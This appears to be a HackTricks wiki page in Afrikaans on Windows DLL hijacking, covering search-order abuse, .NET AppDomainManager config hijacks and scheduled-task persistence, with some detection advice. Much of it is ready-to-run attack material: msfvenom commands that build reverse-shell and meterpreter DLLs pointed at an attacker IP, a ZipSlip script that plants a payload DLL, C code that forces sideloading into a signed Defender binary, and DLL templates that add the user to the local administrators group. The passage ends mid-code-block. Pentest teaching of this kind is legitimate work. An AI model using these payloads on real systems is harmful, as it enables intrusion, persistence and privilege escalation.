# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese inligting

DLL Hijacking behels dat ’n vertroude toepassing gemanipuleer word om ’n kwaadwillige DLL te laai. Die term omvat verskeie taktieke soos **DLL Spoofing, Injection en Side-Loading**. Dit word hoofsaaklik gebruik vir code execution en persistence, en minder dikwels vir privilege escalation. Hoewel die fokus hier op escalation is, bly die hijacking-metode dieselfde ongeag die doelwit.

### Algemene tegnieke

Verskeie metodes word vir DLL hijacking gebruik, en hul doeltreffendheid hang af van die toepassing se DLL-laaistrategie:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Vervang ’n egte DLL met ’n kwaadwillige een, en gebruik opsioneel DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in ’n soekpad wat voor die wettige DLL kom, en buit die toepassing se soekpatroon uit.
3. **Phantom DLL Hijacking**: Skep ’n kwaadwillige DLL wat ’n toepassing sal laai omdat dit dink dat die DLL ’n vereiste DLL is wat nie bestaan nie.
4. **DLL Redirection**: Verander soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local`-lêers om die toepassing na die kwaadwillige DLL te herlei.
5. **WinSxS DLL Replacement**: Vervang die wettige DLL met ’n kwaadwillige eweknie in die WinSxS-gids; hierdie metode word dikwels met DLL side-loading verbind.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in ’n gebruikerbeheerde gids saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution-tegnieke.

’n Toepassing kan ook sy **eie DLL loader** implementeer. ’n Bevoorregte proses kan ’n subgids soos `Libraries` of `Plugins` lys en ’n gekose DLL aan ’n helper deurgee, onafhanklik van die normale Windows DLL-soekorde. As ’n ander rekening lêers in daardie presiese gids kan skep, beskou dit as ’n leidraad vir verdere ondersoek: bevestig die proses se identiteit, die gids se effektiewe ACL, die lêerseleksiereël en ’n bereikbare laai-operasie. ’n Skryfbare gids langs ’n uitvoerbare lêer bewys nie dat die proses DLL’s daaruit laai nie.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + aanvaller-assembly)

Klassieke DLL sideloading is nie die enigste manier om ’n vertroude **.NET Framework**-proses aanvallerkode te laat laai nie. As die teikenuitvoerbare lêer ’n **managed** toepassing is, raadpleeg die CLR ook ’n **toepassingskonfigurasielêer** wat na die uitvoerbare lêer vernoem is (byvoorbeeld `Setup.exe.config`). Dié lêer kan ’n pasgemaakte **AppDomainManager** definieer. As die konfigurasie na ’n aanvallerbeheerde assembly langs die EXE verwys, laai die CLR dit **voordat die toepassing se normale kodepad begin** en voer dit binne die vertroude proses uit.<sup>[[24]](#references)</sup>

Volgens Microsoft se .NET Framework-konfigurasieskema moet beide `<appDomainManagerAssembly>` en `<appDomainManagerType>` teenwoordig wees sodat die pasgemaakte manager gebruik word.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale konfigurasie:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimale bestuurder:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktiese notas:
- Dit is **spesifiek vir .NET Framework** tradecraft. Dit berus op CLR-konfigurasie-ontleding, nie op die Win32 DLL-soekvolgorde nie.
- Die host moet werklik ’n **managed EXE** wees. Vinnige triage: `sigcheck -m target.exe`, `corflags target.exe`, of kyk vir die **CLR Runtime Header** in PE-metadata.
- Die konfigurasielêernaam moet presies met die uitvoerbare lêer se naam ooreenstem (`<binary>.config`) en is gewoonlik **langs die EXE**.
- Dit is nuttig met **ondertekende Microsoft-/verskaffer-binêre lêers**, omdat die vertroude EXE onaangeraak bly terwyl die kwaadwillige managed assembly in-proses uitgevoer word.
- As jy reeds ’n skryfbare installer-/opdateringsgids het, kan AppDomainManager-hijacking as die **eerste stadium** gebruik word, gevolg deur klassieke DLL-sideloading of reflective loading vir latere stadiums.

### AppDomainManager as ’n downloader + scheduled-task bootstrap

’n Praktiese inbraakpatroon is om die vertroude managed EXE met sowel ’n kwaadwillige `*.config` as ’n kwaadwillige AppDomainManager DLL te koppel wat net as ’n **klein bootstrapper** optree:<sup>[[25]](#references)</sup>

1. ’n Gebruiker begin ’n ondertekende .NET-installeerder of -opdateraar vanaf ’n geloofwaardige ligging soos `%USERPROFILE%\Downloads`.
2. Die aangrensende konfigurasie laat die CLR die aanvaller se assembly laai **voordat** die wettige programlogika begin.
3. Die kwaadwillige manager voer ’n **padhek** uit (byvoorbeeld, gaan net voort as die host EXE vanaf `Downloads` loop, en laat die tweede stadium net vanaf `%LOCALAPPDATA%` loop).
4. As die kontrole slaag, laai dit die werklike payload af na ’n gebruikerskryfbare pad soos `%LOCALAPPDATA%\PerfWatson2.exe` en stel dit volharding met ’n scheduled task in.

Waarom hierdie variant saak maak:
- Die ondertekende host EXE bly onveranderd, dus kan triage wat net die hoofbinêre lêer se hash nagaan, die kompromittering miskyk.
- Eenvoudige **padgebaseerde anti-analise** is algemeen: as die ZIP/EXE/DLL-trio na Desktop, Temp of ’n sandbox-pad geskuif word, kan dit die ketting doelbewus breek.
- Die eerste-stadium AppDomainManager DLL kan klein en min opvallend bly terwyl die werklike implant later afgelaai word.

Minimale voorbeeld van volharding wat gereeld met hierdie patroon voorkom:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notas:
- `/rl highest` beteken **hoogste beskikbare** vir daardie gebruiker/sessie; dit is nie op sigself ’n gewaarborgde SYSTEM-eskalasie nie.
- Hierdie tegniek word dikwels beter gekategoriseer as **uitvoering/volharding via .NET-konfigurasie-misbruik** as klassieke DLL-soekvolgorde-kaping weens ontbrekende DLL’s, hoewel operateurs dikwels albei saam gebruik.

Opsporingspunte:
- Getekende .NET-uitvoerbare lêers wat vanaf **ZIP-onttrekkingspaaie**, `Downloads`, `%TEMP%` of ander gebruiker-skryfbare vouers geloods word, met ’n **saamgeplaaste** `<exe>.config`.
- Nuwe geskeduleerde take waarvan die aksie na `%LOCALAPPDATA%`, `%APPDATA%` of `Downloads` wys en waarvan die name soos blaaier-/verskaffer-opdateringsprogramme lyk.
- Kortlewende bestuurde bootstrap-prosesse wat onmiddellik ’n ander EXE aflaai en dan `schtasks.exe` laat loop.
- Monsters wat vroeg afsluit tensy die uitvoerbare lêer se pad met ’n verwagte gebruikerprofielgids ooreenstem.

### Kaping van ’n bestaande geskeduleerde taak om die sideload-ketting weer te begin

Vir volharding, moenie net soek na **die skep van ’n nuwe taak** nie. Sommige inbraakgroepe wag totdat ’n wettige installeerder ’n **gewone opdateringstaak** skep en herskryf dan die taakaksie sodat die bestaande naam, outeur en sneller vir verdedigers vertroud bly.

Herbruikbare werkvloei:
1. Installeer/laat die wettige sagteware loop en identifiseer die taak wat dit normaalweg skep.
2. Voer die taak se XML uit en teken die huidige `<Exec><Command>`- / `<Arguments>`-waardes aan.<sup>[[23]](#references)</sup>
3. Vervang slegs die aksie sodat die taak jou **vertroude gasheer-EXE** vanaf ’n gebruiker-skryfbare stasieringsgids begin; dié laai dan die werklike loonvrag sywaarts of via AppDomain.
4. Registreer dieselfde taaknaam weer in plaas daarvan om ’n nuwe, ooglopende volhardingsartefak te skep.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Waarom dit moeiliker opspoorbaar is:
- Die taaknaam kan steeds wettig lyk (byvoorbeeld ’n verskaffer se updater).
- Die **Task Scheduler service** begin dit, dus sien ouer-/voorouerprosesvalidasie dikwels die verwagte skeduleringsketting in plaas van `explorer.exe`.
- DFIR-spanne wat net na **nuwe taakname** soek, kan ’n taak miskyk waarvan die registrasie reeds bestaan het, maar waarvan die aksie nou na `%LOCALAPPDATA%`, `%APPDATA%` of ’n ander pad onder die aanvaller se beheer wys.

Vinnige jagpunte:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergelyk die XML-lêers in `C:\Windows\System32\Tasks\*` en metadata in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` met ’n basislyn.
- Maak ’n alarm wanneer ’n **updater-taak wat na ’n verskaffer lyk** vanaf **skryfbare gebruikersgidse** uitvoer of ’n .NET EXE met ’n langsaanliggende `*.config`-lêer begin.

> [!TIP]
> Vir ’n stap-vir-stap-ketting wat HTML-staging, AES-CTR-konfigurasies en .NET-implants bo-op DLL-sideloading stapel, lees die werkvloei hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Vind ontbrekende DLL's

Die algemeenste manier om ontbrekende DLL's in ’n stelsel te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop en die **volgende 2 filters** **in te stel**:

![Algemene tegnieke - Vind ontbrekende DLL's: Die algemeenste manier om ontbrekende DLL's in ’n stelsel te vind, is om procmon van sysinternals te laat loop en die volgende 2 filters in te stel](<../../../images/image (961).png>)

![Algemene tegnieke - Vind ontbrekende DLL's: Die algemeenste manier om ontbrekende DLL's in ’n stelsel te vind, is om procmon van sysinternals te laat loop en die volgende 2 filters in te stel](<../../../images/image (230).png>)

en net die **File System Activity** te wys:

![Algemene tegnieke - Vind ontbrekende DLL's: en wys net die File System Activity](<../../../images/image (153).png>)

As jy **ontbrekende DLL's in die algemeen** soek, **laat** jy dit vir ’n paar **sekondes** loop.\
As jy ’n **ontbrekende DLL in ’n spesifieke uitvoerbare lêer** soek, stel nog ’n filter in, soos **"Process Name" "contains" `<exec name>`**, voer dit uit en hou op om gebeurtenisse vas te lê.<sup>[[9]](#references)</sup>

## Ontbrekende DLL's uitbuit

Om voorregte te verhoog, soek ’n **DLL wat ’n bevoorregte proses probeer laai** vanaf ’n ligging waarna jy kan skryf. Dit kan gebeur wanneer jy beheer het oor ’n gids wat voor die gids met die wettige DLL deursoek word, of wanneer die aangevraagde DLL nie bestaan nie en jy na een van die deursoekte gidse kan skryf.

### DLL-soekvolgorde

**In die** [**Microsoft-dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy spesifiek lees hoe DLL's gelaai word.**

**Windows-toepassings** soek na DLL's deur ’n stel **vooraf gedefinieerde soekpaaie** in ’n bepaalde volgorde te volg. DLL-hijacking vind plaas wanneer ’n skadelike DLL strategies in een van hierdie gidse geplaas word, sodat dit voor die egte DLL gelaai word. Om dit te voorkom, moet die toepassing absolute paaie gebruik wanneer dit na die DLL's verwys wat dit benodig.

Hieronder kan jy die **DLL-soekvolgorde op 32-bis**-stelsels sien:

1. Die gids waaruit die toepassing gelaai is.
2. Die stelselgids. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)-funksie om die pad na hierdie gids te kry.(_C:\Windows\System32_)
3. Die 16-bis-stelselgids. Daar is geen funksie wat die pad na hierdie gids verkry nie, maar dit word wel deursoek. (_C:\Windows\System_)
4. Die Windows-gids. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)-funksie om die pad na hierdie gids te kry.
   1. (_C:\Windows_)
5. Die huidige gids.
6. Die gidse wat in die PATH-omgewingsveranderlike gelys word. Let daarop dat dit nie die toepassing-spesifieke pad insluit wat deur die **App Paths**-registersleutel gespesifiseer word nie. Die **App Paths**-sleutel word nie gebruik wanneer die DLL-soekpad bereken word nie.

Dit is die **verstek**-soekvolgorde wanneer **SafeDllSearchMode** geaktiveer is. Wanneer dit gedeaktiveer is, skuif die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die registerwaarde **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** en stel dit op 0 (die verstek is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)-funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** geroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens kan ’n DLL met ’n absolute pad eerder as met ’n naam gelaai word. In daardie geval soek Windows net op daardie pad na die DLL self; afhanklikhede wat met ’n naam aangevra word, volg steeds die toepaslike soekvolgorde.

Daar is ander maniere om die soekvolgorde te verander, maar ek gaan dit nie hier verduidelik nie.

### Ketting van ’n arbitrary file write in ’n missing-DLL hijack

**Verwante tegniek:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Gebruik **ProcMon**-filters (`Process Name` = teiken-EXE, `Path` eindig op `.dll`, `Result` = `NAME NOT FOUND`) om DLL-name te versamel waarna die proses soek, maar nie kan vind nie.<sup>[[14]](#references)</sup>
2. As die binary volgens ’n **skedule/diens** loop, sal ’n DLL met een van daardie name wat in die **toepassingsgids** (soekvolgorde-inskrywing #1) geplaas word, tydens die volgende uitvoering gelaai word. In een .NET-scanner-geval het die proses na `hostfxr.dll` in `C:\samples\app\` gesoek voordat dit die regte kopie vanaf `C:\Program Files\dotnet\fxr\...` gelaai het.
3. Bou ’n payload-DLL (bv. ’n reverse shell) met enige uitvoer: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. As jou primitive ’n **ZipSlip-styl arbitrary write** is, skep ’n ZIP waarvan ’n inskrywing uit die onttrekkingsgids ontsnap sodat die DLL in die toepassingsgids beland:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Lewer die argief by die gemonitorde inbox/share af; wanneer die geskeduleerde taak die proses weer begin, laai dit die kwaadwillige DLL en voer jou kode as die diensrekening uit.

### Dwing sideloading af via RTL_USER_PROCESS_PARAMETERS.DllPath

’n Gevorderde manier om die DLL-soekpad van ’n nuutgeskepte proses deterministies te beïnvloed, is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS in te stel wanneer die proses met ntdll se native API’s geskep word. Deur hier ’n aanvallerbeheerde gids te verskaf, kan ’n teikenproses wat ’n geïmporteerde DLL volgens naam oplos (geen absolute pad nie en nie met die veilige laaivlae nie), gedwing word om ’n kwaadwillige DLL uit daardie gids te laai.

Sleutelidee
- Bou die prosesparameters met RtlCreateProcessParametersEx en verskaf ’n pasgemaakte DllPath wat na jou beheerde vouer wys (bv. die gids waar jou dropper/unpacker geleë is).
- Skep die proses met RtlCreateUserProcess. Wanneer die teikenbinary ’n DLL volgens naam oplos, sal die loader hierdie DllPath tydens die oplossing raadpleeg, wat betroubare sideloading moontlik maak, selfs wanneer die kwaadwillige DLL nie saam met die teiken-EXE in dieselfde gids is nie.

Notas/beperkings
- Dit beïnvloed die child-proses wat geskep word; dit verskil van SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet ’n DLL volgens naam invoer of LoadLibrary gebruik (geen absolute pad nie, en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories gebruik nie).
- KnownDLLs en hardgekodeerde absolute paaie kan nie gekaap word nie. Forwarded exports en SxS kan die volgorde van voorkeur verander.

Minimale C-voorbeeld (ntdll, wide strings, vereenvoudigde fouthantering):

<details>
<summary>Volledige C-voorbeeld: dwing DLL-sideloading af via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Voorbeeld van operasionele gebruik
- Plaas ’n kwaadwillige xmllite.dll (wat die vereiste funksies uitvoer of as proxy na die regte een optree) in jou DllPath-gids.
- Begin ’n ondertekende binary waarvan bekend is dat dit volgens die tegniek hierbo xmllite.dll op naam soek. Die loader los die import op via die verskafte DllPath en sideload jou DLL.

Daar is waargeneem dat hierdie tegniek in-die-wild multi-stadium-sideloading-kettings aandryf: ’n aanvanklike launcher laat ’n helper-DLL val, wat dan ’n Microsoft-ondertekende, hijackable binary met ’n pasgemaakte DllPath begin om die aanvaller se DLL uit ’n staging-gids te laat laai.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Vir **.NET Framework**-teikens kan sideloading **voor `Main()`** plaasvind sonder om geheue te patch deur die toepassing se aangrensende **`.exe.config`**-lêer te misbruik. In plaas daarvan om net op die Win32 DLL-soekvolgorde staat te maak, plaas die aanvaller ’n wettige .NET EXE langs ’n kwaadwillige config en een of meer assemblies onder die aanvaller se beheer.

Hoe die ketting werk:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die gasheer-EXE begin en die **CLR lees `<exe>.config`**.
2. Die config stel **`<appDomainManagerAssembly>`** en **`<appDomainManagerType>`** in sodat die runtime ’n aanvallerbeheerde `AppDomainManager` skep.
3. Die kwaadwillige manager kry **uitvoering voor `Main()`** binne die vertroude gasheerproses.
4. Dieselfde config kan die CLR dwing om eers plaaslike assemblies op te los (byvoorbeeld `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) en kan runtime-validering/telemetrie verswak sonder inline patching.

Veldtogagtige patroon (presiese nesstruktuur kan volgens directive / CLR-weergawe verskil):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Waarom dit nuttig is:
- **`<probing privatePath="."/>`** hou assembly-resolusie in die toepassingsgids, wat die vouer in ’n voorspelbare sideloading-oppervlak omskep.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** skuif uitvoering na aanvallerkode tydens CLR-inisialisering, voordat die wettige toepassing se logika loop.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kan ’n toepassing met volle vertroue toelaat om unsigned of gemanipuleerde assemblies te laai sonder ’n strong-name-valideringsfout.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** vermy publisher-policy-omleidings na nuwer assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** maak runtime-keuse meer deterministies.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** is besonder interessant omdat die **CLR sy eie ETW-sigbaarheid vanuit die konfigurasie afskakel**, eerder as dat die implant `EtwEventWrite` in die geheue pleister.

Operasionele patroon wat in onlangse veldtogte waargeneem is:
- Fase 1 plaas `setup.exe`, `setup.exe.config` en plaaslike assemblies.
- Fase 2 kopieer dit na ’n geloofwaardige **AppData update**-vouer, hernoem die gasheer na iets soos `update.exe` en herbegin dit via ’n **geskeduleerde taak**.
- Fase 3 verifieer die uitvoeringskonteks (byvoorbeeld die verwagte ouerproses `svchost.exe` van Taakbeplanner) voordat die finale RAT DLL/export gelaai word.

Idees vir opsporing:
- Getekende of andersins wettige **.NET-uitvoerbare lêers** wat loop met verdagte aangrensende **`.config`**-lêers op plekke waar gebruikers kan skryf.
- `.config`-lêers wat **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** of **`etwEnable enabled="false"`** bevat.
- Geskeduleerde take wat hernoemde update-binaries herbegin vanuit **`%LOCALAPPDATA%`** of toepassing-spesifieke `\bin\update\`-gidse.
- Ouer-/kind-proseskettings waar ’n geskeduleerde taak ’n vertroude .NET-gasheer begin wat onmiddellik nie-verskaffer-assemblies uit sy eie gids laai.

#### Uitsonderings op die DLL-soekvolgorde volgens Windows-dokumentasie

Windows-dokumentasie vermeld sekere uitsonderings op die standaard DLL-soekvolgorde:

- Wanneer ’n **DLL met dieselfde naam as een wat reeds in die geheue gelaai is** teëgekom word, omseil die stelsel die gewone soektog. In plaas daarvan kontroleer dit vir herleiding en ’n manifest voordat dit terugval op die DLL wat reeds in die geheue is. **In hierdie scenario soek die stelsel nie na die DLL nie**.
- As die DLL as ’n **bekende DLL** vir die huidige Windows-weergawe herken word, gebruik die stelsel sy weergawe van die bekende DLL, tesame met enige afhanklike DLL’s, **sonder om te soek**. Die registersleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat ’n lys van hierdie bekende DLL’s.
- As ’n **DLL afhanklikhede het**, word daar na hierdie afhanklike DLL’s gesoek asof hulle slegs deur hul **module name** aangedui is, ongeag of die aanvanklike DLL via ’n volledige pad geïdentifiseer is.

### Privilege-eskalasie

**Vereistes**:

- Identifiseer ’n proses wat onder **ander regte** werk of sal werk (horisontale of laterale beweging), en wat ’n **DLL kort**.
- Maak seker dat **skryftoegang** beskikbaar is vir enige **gids** waarin na die **DLL** gesoek sal word. Dit kan die uitvoerbare lêer se gids of ’n gids binne die stelselpad wees.

Hierdie voorvereistes is by verstek ongewoon: bevoorregte uitvoerbare lêers het gewoonlik nie ontbrekende DLL-afhanklikhede nie, en standaardgebruikers kan gewoonlik nie na stelselsoekpadgidse skryf nie. Verkeerd gekonfigureerde omgewings kan steeds albei toestande blootlê.\
As daar aan die vereistes voldoen word, kyk na die [UACME](https://github.com/hfiref0x/UACME)-projek. Hoewel die hoofdoel daarvan UAC bypass is, bevat dit DLL-hijacking-PoC’s vir spesifieke Windows-weergawes wat dikwels aangepas kan word vir die skryfbare gids wat jy gevind het.

Let daarop dat jy **jou toestemmings in ’n vouer kan nagaan** deur die volgende uit te voer:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

En **kontroleer die toegangsregte van alle vouers binne PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Jy kan ook die imports van ’n executable en die exports van ’n dll nagaan met:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Vir ’n volledige gids oor hoe om **DLL Hijacking te misbruik om voorregte te eskaleer** met toestemmings om in ’n **System Path-lêergids** te skryf, kyk na:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Geoutomatiseerde nutsmiddels

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal nagaan of jy skryftoestemmings het op enige lêergids binne die stelsel se PATH.\
Ander interessante geoutomatiseerde nutsmiddels om hierdie kwesbaarheid te ontdek, is **PowerSploit-funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

As jy ’n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol uit te buit om **’n dll te skep wat minstens al die funksies uitvoer wat die uitvoerbare lêer daaruit sal invoer**. Let egter daarop dat DLL Hijacking handig te pas kom om [van Medium Integrity-vlak na High **(deur UAC te omseil)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)** te eskaleer.** Jy kan ’n voorbeeld vind van **hoe om ’n geldige dll te skep** in hierdie studie oor dll hijacking, wat op DLL hijacking vir uitvoering fokus: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Boonop kan jy in die **volgende afdelin**g ’n paar **basiese dll-kodes** vind wat nuttig kan wees as **sjablone** of om ’n **dll met nie-verpligte uitgevoerde funksies** te skep.

## **DLLs skep en saamstel**

### **DLL Proxifying**

In wese is ’n **DLL-proxy** ’n DLL wat **jou kwaadwillige kode kan uitvoer wanneer dit gelaai word**, maar ook **blootstel** en **werk** soos **verwag** deur **alle oproepe na die werklike biblioteek aan te stuur**.

Met die nutsmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy **’n uitvoerbare lêer aandui en die biblioteek kies** wat jy wil proxify, en ’n **geproxifiseerde dll genereer**, of die **DLL aandui** en ’n **geproxifiseerde dll genereer**.

### **Meterpreter**

**Kry ’n rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Kry 'n meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Skep ’n gebruiker (x86; ek het nie ’n x64-weergawe gesien nie):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Jou eie

In baie gevalle moet die DLL wat jy compile, **elke funksie export wat deur die slagofferproses ingevoer word**. As ’n vereiste export ontbreek, kan die binary dit nie resolve nie en misluk die exploit.

<details>
<summary>C DLL-template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL-voorbeeld met gebruikerskepping</summary>

```c
